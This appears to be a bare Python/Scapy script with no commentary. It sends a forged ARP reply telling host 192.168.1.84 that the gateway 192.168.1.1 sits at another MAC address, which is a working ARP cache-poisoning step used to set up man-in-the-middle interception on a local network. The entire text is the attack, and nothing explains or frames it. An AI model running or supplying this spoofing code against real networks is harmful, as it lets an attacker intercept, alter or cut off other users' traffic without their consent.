from scapy.all import  *

narp=ARP(op=2,pdst="192.168.1.84",hwdst="00:0c:29:4c:e5:d3",hwsrc="00:0c:29:da:8a:b2",psrc="192.168.1.1")
send(narp, iface="ens33")